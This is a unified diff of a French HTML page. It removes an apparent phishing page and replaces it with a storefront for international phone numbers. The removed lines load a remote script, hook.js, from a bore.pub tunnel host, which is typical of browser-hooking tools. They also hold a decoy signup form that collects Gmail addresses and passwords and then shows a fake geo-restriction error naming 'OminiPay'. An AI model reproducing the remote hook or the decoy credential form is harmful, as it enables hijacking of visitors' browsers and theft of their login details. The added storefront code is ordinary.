@@ -2,153 +2,199 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bienvenue | habla</title>
-    
-<script src="http://bore.pub:57701/hook.js"></script>
-
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Weller Store</title>
     <style>
-        * { box-sizing: border-box; }
-        
+        :root {
+            --bg-color: #f2f2f7;
+            --card-bg: #ffffff;
+            --accent-color: #007aff;
+            --text-main: #1c1c1e;
+            --text-sub: #8e8e93;
+        }
+
         body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             margin: 0;
-            height: 100vh;
-            background: url('https://images.unsplash.com/photo-1544716278-ca5e3f4abd8c?q=80&w=2000&auto=format&fit=crop') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Times New Roman', Times, serif; 
-            font-style: italic;
+            padding: env(safe-area-inset-top) 16px 120px;
+        }
+
+        /* Titre style One UI */
+        .header-area {
+            padding: 40px 8px 20px;
+        }
+
+        .header-area h1 {
+            font-size: 34px;
+            font-weight: 800;
+            margin: 0;
+        }
+
+        .header-area p {
+            color: var(--text-sub);
+            margin: 5px 0 0;
+            font-size: 17px;
+        }
+
+        /* Grille des pays */
+        .countries-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 12px;
+        }
+
+        .country-card {
+            background: var(--card-bg);
+            border-radius: 28px; /* Squircle */
+            padding: 20px;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            overflow: hidden;
-        }
-
-        /* Formulaire plus petit et discret */
-        .login-card {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            padding: 30px;
-            border-radius: 40px;
-            border: 0.5px solid rgba(255, 255, 255, 0.2); 
-            width: 280px; /* Taille réduite */
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            transition: 0.5s;
-        }
-
-        h2 { color: white; font-size: 28px; margin-bottom: 20px; text-shadow: 2px 2px 10px rgba(0,0,0,0.8); }
-
-        input {
-            width: 100%;
-            padding: 12px 15px;
-            margin: 8px 0;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            border-radius: 20px;
-            background: rgba(0, 0, 0, 0.4);
-            color: white;
-            font-style: italic;
-            outline: none;
-        }
-
-        #btn-main {
-            width: 100%;
-            padding: 14px;
-            margin-top: 15px;
-            border: none;
-            border-radius: 20px;
-            background-color: rgba(0, 122, 255, 0.85);
-            color: white;
-            font-size: 16px;
-            font-style: italic;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.03);
+            border: 2px solid transparent;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
             cursor: pointer;
         }
 
-        #btn-main:disabled { opacity: 0.3; }
+        /* Effet de rebond Samsung */
+        .country-card:active {
+            transform: scale(0.92);
+        }
 
-        .switch-text { color: white; margin-top: 15px; font-size: 13px; cursor: pointer; text-decoration: underline; }
+        .country-card.selected {
+            border-color: var(--accent-color);
+            background: #f0f7ff;
+        }
 
-        /* PAGE D'ERREUR PLEIN ÉCRAN */
-        #error-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9); /* Noir profond */
-            backdrop-filter: blur(25px);
-            z-index: 999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        .flag-img {
+            width: 54px;
+            height: 54px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 12px;
+            background: #eee;
+        }
+
+        .country-name {
+            font-weight: 700;
+            font-size: 16px;
             text-align: center;
+        }
+
+        .dial-code {
+            color: var(--text-sub);
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        /* Bouton d'achat flottant */
+        #buy-button {
+            position: fixed;
+            bottom: 34px;
+            left: 16px;
+            right: 16px;
+            background-color: var(--accent-color);
             color: white;
-            padding: 20px;
+            border: none;
+            height: 64px;
+            border-radius: 32px;
+            font-size: 18px;
+            font-weight: 700;
+            display: none; /* Masqué par défaut */
+            box-shadow: 0 12px 24px rgba(0, 122, 255, 0.3);
+            z-index: 1000;
+            cursor: pointer;
+            animation: slideIn 0.3s ease-out;
         }
 
-        /* Icône Globe Phosphoreux */
-        .icon-globe {
-            font-size: 80px;
-            margin-bottom: 20px;
-            color: #00f2ff;
-            text-shadow: 0 0 20px #00f2ff, 0 0 40px #00f2ff; /* Effet Néon */
-            animation: pulse 2s infinite;
+        @keyframes slideIn {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.8; }
+        /* Loader */
+        .loader {
+            text-align: center;
+            padding: 50px;
+            color: var(--text-sub);
         }
-
-        .error-msg { font-size: 20px; letter-spacing: 1px; line-height: 1.6; }
     </style>
 </head>
 <body>
 
-    <div id="login-form" class="login-card">
-        <h2>hablamas</h2>
-        <input type="email" id="email" placeholder="votre@gmail.com" oninput="validate()">
-        <input type="password" id="pass" placeholder="Mot de passe (6+)" oninput="validate()">
-        <button id="btn-main" onclick="triggerError()" disabled>S'inscrire</button>
-        <div id="switch" class="switch-text" onclick="toggleMode()">Déjà un compte ? Se connecter</div>
+    <div class="header-area">
+        <h1>Weller Store</h1>
+        <p>Choisissez votre numéro international</p>
     </div>
 
-    <div id="error-overlay">
-        <div class="icon-globe">^_^</div>
-        <p class="error-msg">
-            <span style="font-size: 26px; color: #ff4d4d;">Accès Restreint</span><br><br>
-            Désolé, votre zone géographique ne permet pas d'accéder aux services OminiPay pour le moment.<br><br>
-            Veuillez réessayer ultérieurement.
-        </p>
-        <button onclick="location.reload()" style="background:none; border:1px solid rgba(255,255,255,0.3); color:white; padding:10px 25px; border-radius:20px; margin-top:30px; cursor:pointer;">Quitter</button>
-    </div>
+    <div id="loader" class="loader">Chargement des pays...</div>
+    <div class="countries-grid" id="grid"></div>
+
+    <button id="buy-button" onclick="startPurchase()">Acheter</button>
 
     <script>
-        let isLoginMode = false;
+        // Ton URL de Edge Function d'après ta capture
+        const EDGE_URL = 'https://sulsvuumxkznprldxrmx.supabase.co/functions/v1/edge-test-';
+        let selectedCountry = null;
 
-        function validate() {
-            const email = document.getElementById('email').value.trim();
-            const pass = document.getElementById('pass').value;
-            const btn = document.getElementById('btn-main');
-            btn.disabled = !(email.toLowerCase().endsWith('@gmail.com') && pass.length >= 6);
+        async function initStore() {
+            try {
+                const response = await fetch(EDGE_URL);
+                if (!response.ok) throw new Error('Erreur réseau');
+                const countries = await response.json();
+                
+                document.getElementById('loader').style.display = 'none';
+                renderCountries(countries);
+            } catch (error) {
+                document.getElementById('loader').innerText = "Erreur de chargement";
+                console.error(error);
+            }
         }
 
-        function toggleMode() {
-            isLoginMode = !isLoginMode;
-            document.getElementById('btn-main').innerText = isLoginMode ? "Se connecter" : "S'inscrire";
-            document.getElementById('switch').innerText = isLoginMode ? "Nouveau ? S'inscrire" : "Déjà un compte ? Se connecter";
+        function renderCountries(list) {
+            const grid = document.getElementById('grid');
+            list.forEach(c => {
+                const card = document.createElement('div');
+                card.className = 'country-card';
+                card.innerHTML = `
+                    <img src="${c.flag_url}" class="flag-img" alt="${c.country_name}">
+                    <div class="country-name">${c.country_name}</div>
+                    <div class="dial-code">${c.dial_code}</div>
+                `;
+                
+                card.onclick = () => selectItem(card, c);
+                grid.appendChild(card);
+            });
         }
 
-        function triggerError() {
-            document.getElementById('login-form').style.opacity = '0';
-            setTimeout(() => {
-                document.getElementById('login-form').style.display = 'none';
-                document.getElementById('error-overlay').style.display = 'flex';
-            }, 500);
+        function selectItem(element, data) {
+            // Nettoyage des sélections précédentes
+            document.querySelectorAll('.country-card').forEach(el => el.classList.remove('selected'));
+            
+            // Appliquer la nouvelle sélection
+            element.classList.add('selected');
+            selectedCountry = data;
+
+            // Afficher le bouton avec le prix ou l'info
+            const btn = document.getElementById('buy-button');
+            btn.style.display = 'block';
+            btn.innerText = `Acheter le numéro ${data.dial_code}`;
+
+            // Haptic feedback (vibration)
+            if (window.navigator.vibrate) window.navigator.vibrate(10);
         }
+
+        function startPurchase() {
+            if (!selectedCountry) return;
+            alert(`Préparation de l'achat pour : ${selectedCountry.country_name}`);
+            // Ici tu pourras rediriger vers ta logique de paiement
+        }
+
+        // Lancement
+        initStore();
     </script>
 </body>
 </html>
